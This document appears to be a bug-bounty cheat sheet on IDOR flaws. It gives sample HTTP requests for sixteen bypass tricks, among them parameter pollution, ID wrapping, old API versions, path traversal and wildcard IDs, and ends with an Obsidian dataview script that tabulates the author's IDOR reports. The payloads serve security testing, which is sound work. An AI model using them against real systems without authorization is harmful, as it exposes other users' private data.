## Insecure Direct Object Reference (IDOR)

### Introduction

> IDOR stands for Insecure Direct Object Reference is a security vulnerability in which a user is able to access and make changes to data of any other user present in the system.

### Where to find

*   Usually it can be found in APIs.
*   Check the HTTP request that contain unique ID, for example `user_id` or `id`

### How to exploit

1.  Add parameters onto the endpoints for example, if there was

```
GET /api/v1/getuser HTTP/1
Host: example.com
...
```

> Try this to bypass

```
GET /api/v1/getuser?id=1234 HTTP/1
Host: example.com
...
```

2.  HTTP Parameter pollution

```
POST /api/get_profile HTTP/1
Host: example.com
...

user_id=hacker_id&user_id=victim_id
```

3.  Add .json to the endpoint

```
GET /v2/GetData/1234 HTTP/1
Host: example.com
...
```

> Try this to bypass

```
GET /v2/GetData/1234.json HTTP/1
Host: example.com
...
```

4.  Test on outdated API Versions

```
POST /v2/GetData HTTP/1
Host: example.com
...

id=123
```

> Try this to bypass

```
POST /v1/GetData HTTP/1
Host: example.com
...

id=123
```

5.  Wrap the ID with an array.

```
POST /api/get_profile HTTP/1
Host: example.com
...

{"user_id":111}
```

> Try this to bypass

```
POST /api/get_profile HTTP/1
Host: example.com
...

{"id":[111]}
```

6.  Wrap the ID with a JSON object

```
POST /api/get_profile HTTP/1
Host: example.com
...

{"user_id":111}
```

> Try this to bypass

```
POST /api/get_profile HTTP/1
Host: example.com
...

{"user_id":{"user_id":111}}
```

7.  JSON Parameter Pollution

```
POST /api/get_profile HTTP/1
Host: example.com
...

{"user_id":"hacker_id","user_id":"victim_id"}
```

8.  Try decode the ID, if the ID encoded using md5,base64,etc

```
GET /GetUser/dmljdGltQG1haWwuY29t HTTP/1
Host: example.com
...
```

> dmljdGltQG1haWwuY29t => victim@mail.com

9.  If the website using GraphQL, try to find IDOR using GraphQL

```
GET /graphql HTTP/1
Host: example.com
...
```

```
GET /graphql.php?query= HTTP/1
Host: example.com
...
```

10.  MFLAC (Missing Function Level Access Control)

```
GET /admin/profile HTTP/1
Host: example.com
...
```

> Try this to bypass

```
GET /ADMIN/profile HTTP/1
Host: example.com
...
```

11.  Try to swap uuid with number

```
GET /file?id=90ri2-xozifke-29ikedaw0d HTTP/1
Host: example.com
...
```

> Try this to bypass

```
GET /file?id=302
Host: example.com
...
```

12.  Change HTTP Method

```
GET /api/v1/users/profile/111 HTTP/1
Host: example.com
...
```

> Try this to bypass

```
POST /api/v1/users/profile/111 HTTP/1
Host: example.com
...
```

13.  Path traversal

```
GET /api/v1/users/profile/victim_id HTTP/1
Host: example.com
...
```

> Try this to bypass

```
GET /api/v1/users/profile/my_id/../victim_id HTTP/1
Host: example.com
...
```

14.  Change request `Content-Type`

```
GET /api/v1/users/1 HTTP/1
Host: example.com
Content-type: application/xml
```

> Try this to bypass

```
GET /api/v1/users/2 HTTP/1
Host: example.com
Content-type: application/json
```

15.  Send wildcard instead of ID

```
GET /api/users/111 HTTP/1
Host: example.com
```

> Try this to bypass

```
GET /api/users/* HTTP/1
Host: example.com
```

```
GET /api/users/% HTTP/1
Host: example.com
```

```
GET /api/users/_ HTTP/1
Host: example.com
```

```
GET /api/users/. HTTP/1
Host: example.com
```

16.  Try google dorking to find new endpoint

### References

*   [github](https://github.com/daffainfo/AllAboutBugBounty) and other medium writeup

### Eg:
```dataviewjs
let tableData = [];

// 获取具有标签 #idor 的文件路径
for (let note of dv.pagePaths('"Bughunter-report" and #idor')) {
    dv.io.load(note).then((fileContent) => {
        if (fileContent !== undefined) {
            // 将文件内容按行分割成数组
            let lines = fileContent.split('\n');
            let Markdown = dv.fileLink(note)
            let title = ''; // 存储二级标题作为 "Title"
            let summaryContent = '';
            let stepContent = '';
            let impactContent = '';
				let count = 0;
            // 存储当前正在处理的三级标题
            let currentSection = '';

            // 遍历每一行文本
            for (let i = 0; i < lines.length; i++) {
                let line = lines[i];
                if (line.startsWith('## ') && lines[i + 1] && lines[i + 1].includes('#idor')) {
                    // 如果是满足条件的二级标题，将其作为 "Title"
                    title = line.replace('## ', '');
                    continue;
                } else if (line.startsWith('### Summary')) {
                    currentSection = 'Summary';
                    summaryContent = '';
                } else if (line.startsWith('### Step')) {
                    currentSection = 'Step';
                    stepContent = '';
                } else if (line.startsWith('### Impact')) {
                    currentSection = 'Impact';
                    impactContent = '';
                } else if (line.startsWith('### ')) { 
                    // 其他三级标题，跳过处理 
                    currentSection = '';
                }
                
                // 在此处将处理内容的部分与行同级
                if (currentSection === 'Summary') {
                    summaryContent += line + '\n';
                } else if (currentSection === 'Step') {
                    stepContent += line + '\n';
                } else if (currentSection === 'Impact') {
                    impactContent += line + '\n';
                    count ++ ;
                }

                // 判断是否推送数据
                if ((lines[i+1].startsWith('## ') && lines[i + 2] && lines[i + 2].includes('#idor')) || (i === lines.length - 2)) {
                    // 将标题和内容添加到表格数据
                    tableData.push([Markdown, title, summaryContent.trim(), stepContent.trim(), impactContent.trim()]);
                    title = ''; // 存储二级标题作为 "Title"
                    summaryContent = '';
                    stepContent = '';
                    impactContent = '';
                    count = 0; // 重置 count 的值
                }
            }
        }
    });
}

// 创建包含四列的表格，"Markdown","Title", "Summary", "Step" 和 "Impact"
setTimeout(() => {
    dv.table(["Markdown","Title", "Summary", "Step", "Impact"], tableData);
}, 1000); // 使用适当的延迟时间等待异步操作完成


```